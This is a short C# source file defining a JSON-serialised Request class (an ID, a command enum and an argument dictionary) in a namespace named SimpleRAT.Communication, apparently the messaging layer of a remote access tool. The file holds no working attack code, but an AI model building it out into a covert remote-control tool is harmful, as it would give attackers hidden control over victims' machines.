using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SimpleRAT.Communication
{
    public class Request
    {
        public Request()
        {
            ID = 0;
            Command = Commands.NONE;
            Arguments = new Dictionary<string, string>();
        }
        [JsonProperty("id")]
        public int ID { get; set; }

        [JsonProperty("command")]
        public Commands Command { get; set; }

        [JsonProperty("arguments")]
        public Dictionary<string, string> Arguments { get; set; }
    }
}
